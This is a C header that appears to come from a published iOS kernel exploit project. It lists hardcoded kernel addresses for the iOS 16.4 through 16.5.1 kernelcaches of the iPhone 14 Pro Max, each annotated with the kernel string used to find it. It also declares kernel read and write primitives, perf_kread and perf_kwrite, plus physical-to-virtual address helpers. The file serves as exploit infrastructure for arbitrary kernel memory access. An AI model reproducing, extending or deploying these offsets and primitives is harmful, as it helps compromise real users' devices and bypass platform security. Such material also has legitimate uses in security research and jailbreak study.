/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef perf_h
#define perf_h

#include "info/static_info.h"
#include "common.h"

struct kernelcache_addresses {
    u64 kernel_base;
    u64 vn_kqfilter;                     // "Invalid knote filter on a vnode!"
    u64 ptov_table;                      // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 gVirtBase;                       // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 gPhysBase;                       // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 gPhysSize;                       // (gPhysBase + 0x8)
    u64 perfmon_devices;                 // "perfmon: %s: devfs_make_node_clone failed"
    u64 perfmon_dev_open;                // "perfmon: attempt to open unsupported source: 0x%x"
    u64 cdevsw;                          // "Can't mark ptc as kqueue ok"
    u64 vm_pages;                        // "pmap_startup(): too many pages to support vm_page packing"
    u64 vm_page_array_beginning_addr;    // "pmap_startup(): too many pages to support vm_page packing"
    u64 vm_page_array_ending_addr;       // "pmap_startup(): too many pages to support vm_page packing"
    u64 vm_first_phys_ppnum;             // "pmap_startup(): too many pages to support vm_page packing"
};

static const struct kernelcache_addresses kcs[] = {
    // An index of zero means that the version is unsupported.
    {},
    // From the iOS 16.4 kernelcache for the iPhone 14 Pro Max.
    {
        .kernel_base = 0xfffffff007004000,
        .vn_kqfilter = 0xfffffff007f3960c,
        .ptov_table = 0xfffffff0078e7178,
        .gVirtBase = 0xfffffff0079320a8,
        .gPhysBase = 0xfffffff007933ed0,
        .gPhysSize = 0xfffffff007933ed8,
        .perfmon_devices = 0xfffffff00a44f500,
        .perfmon_dev_open = 0xfffffff007eecd3c,
        .cdevsw = 0xfffffff00a411208,
        .vm_pages = 0xfffffff0078e3eb8,
        .vm_page_array_beginning_addr = 0xfffffff0078e6128,
        .vm_page_array_ending_addr = 0xfffffff00a44e988,
        .vm_first_phys_ppnum = 0xfffffff00a44e990,
    },
    // From the iOS 16.5 kernelcache for the iPhone 14 Pro Max.
    {
        .kernel_base = 0xfffffff007004000,
        .vn_kqfilter = 0xfffffff007f39b28,
        .ptov_table = 0xfffffff0078e7178,
        .gVirtBase = 0xfffffff0079321e8,
        .gPhysBase = 0xfffffff007934010,
        .gPhysSize = 0xfffffff007934018,
        .perfmon_devices = 0xfffffff00a457500,
        .perfmon_dev_open = 0xfffffff007eecfc0,
        .cdevsw = 0xfffffff00a419208,
        .vm_pages = 0xfffffff0078e3eb8,
        .vm_page_array_beginning_addr = 0xfffffff0078e6128,
        .vm_page_array_ending_addr = 0xfffffff00a456988,
        .vm_first_phys_ppnum = 0xfffffff00a456990,
    },
    // From the iOS 16.5.1 kernelcache for the iPhone 14 Pro Max.
    {
        .kernel_base = 0xfffffff007004000,
        .vn_kqfilter = 0xfffffff007f39c18,
        .ptov_table = 0xfffffff0078e7178,
        .gVirtBase = 0xfffffff007932288,
        .gPhysBase = 0xfffffff0079340b0,
        .gPhysSize = 0xfffffff0079340b8,
        .perfmon_devices = 0xfffffff00a457500,
        .perfmon_dev_open = 0xfffffff007eed0b0,
        .cdevsw = 0xfffffff00a419208,
        .vm_pages = 0xfffffff0078e3eb8,
        .vm_page_array_beginning_addr = 0xfffffff0078e6128,
        .vm_page_array_ending_addr = 0xfffffff00a456988,
        .vm_first_phys_ppnum = 0xfffffff00a456990,
    }
};

void perf_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size);

void perf_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size);

void perf_run(struct kfd* kfd);

void perf_free(struct kfd* kfd);

void perf_init(struct kfd* kfd);

/*
 * Helper perf functions.
 */
uint64_t phystokv(struct kfd* kfd, uint64_t pa);

uint64_t vtophys(struct kfd* kfd, uint64_t va);
#endif /* perf_h */
